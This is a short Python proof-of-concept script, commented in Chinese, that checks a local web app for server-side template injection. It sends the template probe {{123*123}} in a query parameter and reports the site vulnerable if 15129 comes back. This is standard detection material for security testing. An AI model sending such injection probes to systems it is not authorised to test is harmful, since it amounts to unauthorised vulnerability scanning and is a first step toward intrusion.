"""
ssti 服务端模板注入 POC
"""


import requests
url = 'http://127.0.0.1:5000/'
payload = "?name={{123*123}}"

res = requests.get(url+payload)
# print(res.text)

if "15129" in res.text:
    print('%s 存在SSIT服务端模板注入漏洞！' % url)
else:
    print('%s 不存在SSIT服务端模板注入漏洞！' % url)




